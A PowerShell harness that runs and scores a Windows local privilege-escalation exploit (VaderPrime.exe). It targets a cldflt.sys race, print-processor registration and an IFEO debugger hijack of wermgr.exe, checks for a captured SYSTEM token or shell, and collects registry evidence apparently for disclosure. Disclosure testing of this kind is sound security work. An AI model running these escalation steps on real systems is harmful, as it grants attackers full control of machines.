param(
    [ValidateSet("all", "validate", "printproc", "ifeo", "preflight")]
    [string]$Mode = "all",
    [switch]$PreFlightOnly
)

$ErrorActionPreference = "Continue"
$ExploitDir = "C:\Users\gwu07\Desktop\vader-rootkit\exploits\vader-prime"
$EvidenceDir = "C:\Users\gwu07\Desktop\vader-rootkit\disclosure\evidence\vader-prime"
$Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$LogFile = Join-Path $EvidenceDir "test-run-$Timestamp.log"

function Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "HH:mm:ss"
    $entry = "[$ts] [$Level] $Message"
    Write-Host $entry
    Add-Content -Path $LogFile -Value $entry -Encoding UTF8
}

function LogSection {
    param([string]$Title)
    Log ("=" * 60)
    Log $Title
    Log ("=" * 60)
}

New-Item -ItemType Directory -Path $EvidenceDir -Force | Out-Null
Log "VADER-PRIME Automated Test Harness"
Log "Timestamp: $Timestamp"
Log "Mode: $Mode"
Log ("Evidence: " + $EvidenceDir)
Log ("System: " + $env:COMPUTERNAME)
Log ("User: " + $env:USERNAME)
$osBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
Log ("OS Build: " + $osBuild)

# ============================================================
# PRE-FLIGHT CHECKS
# ============================================================
LogSection "PRE-FLIGHT CHECKS"

# cldflt.sys
$cldfltOutput = sc.exe query cldflt 2>&1 | Out-String
$cldfltRunning = $cldfltOutput -match "RUNNING"
if ($cldfltRunning) { Log "cldflt.sys: RUNNING" "PASS" }
else { Log "cldflt.sys: NOT RUNNING - race will fail" "FAIL" }
Set-Content -Path (Join-Path $EvidenceDir "preflight-cldflt-$Timestamp.txt") -Value $cldfltOutput -Encoding UTF8

# Admin check
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) { Log "Running as ADMIN (warning - results may not reflect std user)" "WARN" }
else { Log "Running as standard user (correct)" "PASS" }

# Binaries
$exeExists = Test-Path (Join-Path $ExploitDir "VaderPrime.exe")
$dllExists = Test-Path (Join-Path $ExploitDir "vaderproc.dll")
$ntapiExists = Test-Path (Join-Path $ExploitDir "NtApiDotNet.dll")
Log ("VaderPrime.exe: " + $(if ($exeExists) {"FOUND"} else {"MISSING"}))
Log ("vaderproc.dll: " + $(if ($dllExists) {"FOUND"} else {"MISSING"}))
Log ("NtApiDotNet.dll: " + $(if ($ntapiExists) {"FOUND"} else {"MISSING - copy from MiniPlasma"}))

# Defender
try {
    $mp = Get-MpPreference -ErrorAction Stop
    $rtp = -not $mp.DisableRealtimeMonitoring
    Log ("Defender RTP: " + $(if ($rtp) {"ENABLED (correct)"} else {"DISABLED"}))
} catch {
    Log "Defender RTP: cannot query" "WARN"
}

# Spooler
$spool = Get-Service Spooler -ErrorAction SilentlyContinue
if ($spool) { Log ("Print Spooler: " + $spool.Status) } else { Log "Print Spooler: not found" "WARN" }

# Registry baseline
LogSection "REGISTRY BASELINE (BEFORE)"
try {
    $procs = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors" -ErrorAction Stop | Select-Object -ExpandProperty PSChildName
    Log ("Print Processors: " + ($procs -join ", "))
} catch { Log "Cannot enumerate Print Processors" "WARN"; $procs = @() }

# Mount HKU
$hkuMounted = $false
if (-not (Test-Path "HKU:")) {
    try { New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction Stop | Out-Null; $hkuMounted = $true }
    catch { Log "Cannot mount HKU" "WARN" }
}

$windirBefore = $null
try {
    $volEnv = Get-ItemProperty "HKU:\.DEFAULT\Volatile Environment" -ErrorAction Stop
    $windirBefore = $volEnv.windir
    if ($windirBefore) { Log ("Volatile Env windir BEFORE: " + $windirBefore) "NOTE" }
    else { Log "Volatile Env windir: NOT SET (clean)" }
} catch { Log "Cannot read .DEFAULT\Volatile Environment" "INFO" }

# Save baseline
$baseline = @{
    PrintProcessors = $procs
    WindirBefore = $windirBefore
    Timestamp = $Timestamp
}
$baseline | ConvertTo-Json | Set-Content (Join-Path $EvidenceDir "baseline-$Timestamp.json") -Encoding UTF8

if ($PreFlightOnly) {
    LogSection "PRE-FLIGHT COMPLETE"
    Log "All checks done. No exploit executed."
    Log ("Log: " + $LogFile)
    exit 0
}

if (-not $cldfltRunning) {
    Log "ABORT: cldflt.sys not running." "FATAL"
    exit 1
}
if (-not $exeExists) {
    Log "ABORT: VaderPrime.exe missing." "FATAL"
    exit 1
}

# ============================================================
# EXPLOIT EXECUTION
# ============================================================

function Run-Mode {
    param([string]$Name, [string]$ExeArgs, [int]$Timeout = 180)

    LogSection ("TESTING: " + $Name)
    Log ("Args: " + $ExeArgs)
    Log ("Timeout: " + $Timeout + "s")

    $outFile = Join-Path $EvidenceDir "output-$Name-$Timestamp.txt"
    $errFile = Join-Path $EvidenceDir "stderr-$Name-$Timestamp.txt"
    $sw = [System.Diagnostics.Stopwatch]::StartNew()

    try {
        $p = Start-Process -FilePath (Join-Path $ExploitDir "VaderPrime.exe") `
            -ArgumentList $ExeArgs `
            -WorkingDirectory $ExploitDir `
            -RedirectStandardOutput $outFile `
            -RedirectStandardError $errFile `
            -PassThru -NoNewWindow

        $done = $p.WaitForExit($Timeout * 1000)
        $sw.Stop()

        if (-not $done) {
            Log "TIMEOUT - killing" "WARN"
            try { Stop-Process -Id $p.Id -Force -ErrorAction Stop } catch {}
            Start-Sleep 2
        }

        Log ("Exit: " + $p.ExitCode)
        Log ("Duration: " + [math]::Round($sw.Elapsed.TotalSeconds, 1) + "s")

        if (Test-Path $outFile) {
            $out = Get-Content $outFile -Raw -ErrorAction SilentlyContinue
            Log ("Output: " + $out.Length + " chars")

            if ($out -match "SYSTEM TOKEN CAPTURED") {
                Log "*** SYSTEM TOKEN CAPTURED ***" "CRITICAL"
                return "SUCCESS"
            }
            if ($out -match "SYSTEM shell spawned") {
                Log "*** SYSTEM SHELL SPAWNED ***" "CRITICAL"
                return "SUCCESS"
            }
            if ($out -match "ACL acquired") {
                Log "Race won - ACL primitive works" "NOTE"
                if ($out -match "failed|timed out") {
                    return "PARTIAL"
                }
            }
            if ($out -match "not running|Race failed") {
                Log "Race failed" "FAIL"
                return "FAILED"
            }
        }
        return "UNKNOWN"
    } catch {
        Log ("Error: " + $_.Exception.Message) "ERROR"
        return "ERROR"
    }
}

$results = @{}

if ($Mode -eq "all" -or $Mode -eq "validate") {
    $results["validate"] = Run-Mode -Name "validate" -ExeArgs "--validate"
}
if ($Mode -eq "all" -or $Mode -eq "printproc") {
    $results["printproc"] = Run-Mode -Name "printproc" -ExeArgs "--printproc"
}
if ($Mode -eq "all" -or $Mode -eq "ifeo") {
    $results["ifeo"] = Run-Mode -Name "ifeo" -ExeArgs "--ifeo wermgr.exe"
}

# ============================================================
# POST-TEST
# ============================================================
LogSection "SYSTEM STATE (AFTER)"

try {
    $procsAfter = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors" -ErrorAction Stop | Select-Object -ExpandProperty PSChildName
    $newProcs = $procsAfter | Where-Object { $_ -notin $procs }
    if ($newProcs) { Log ("NEW Print Processors: " + ($newProcs -join ", ")) "CRITICAL" }
    else { Log "Print Processors: unchanged" }
} catch { Log "Cannot check Print Processors" "WARN" }

try {
    $volAfter = Get-ItemProperty "HKU:\.DEFAULT\Volatile Environment" -ErrorAction Stop
    if ($volAfter.windir -and -not $windirBefore) {
        Log ("NEW windir value: " + $volAfter.windir) "CRITICAL"
    } else { Log "Volatile Env: clean" }
} catch { Log "Cannot check Volatile Env" "INFO" }

try {
    $ifeoCheck = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wermgr.exe" -Name Debugger -ErrorAction Stop
    Log ("IFEO Debugger residue: " + $ifeoCheck.Debugger) "CRITICAL"
} catch { Log "IFEO wermgr.exe: clean" }

$postState = @{ PrintProcessors = $procsAfter; Timestamp = (Get-Date -Format "o") }
$postState | ConvertTo-Json | Set-Content (Join-Path $EvidenceDir "post-state-$Timestamp.json") -Encoding UTF8

# ============================================================
# SUMMARY
# ============================================================
LogSection "RESULTS"

$anyWin = $false
foreach ($k in $results.Keys) {
    $v = $results[$k]
    $icon = switch ($v) { "SUCCESS" {"[***]"} "PARTIAL" {"[~]"} "FAILED" {"[X]"} default {"[?]"} }
    Log ("$icon $k : $v")
    if ($v -eq "SUCCESS") { $anyWin = $true }
}

if ($anyWin) {
    Log ""
    Log "PRIVILEGE ESCALATION CONFIRMED" "CRITICAL"
    Log "Evidence collected. Prepare disclosure." "CRITICAL"
} else {
    Log ""
    Log "No successful escalation this run."
    Log "Check output files for diagnostics."
}

Log ""
Log ("Evidence: " + $EvidenceDir)
Log ("Log: " + $LogFile)
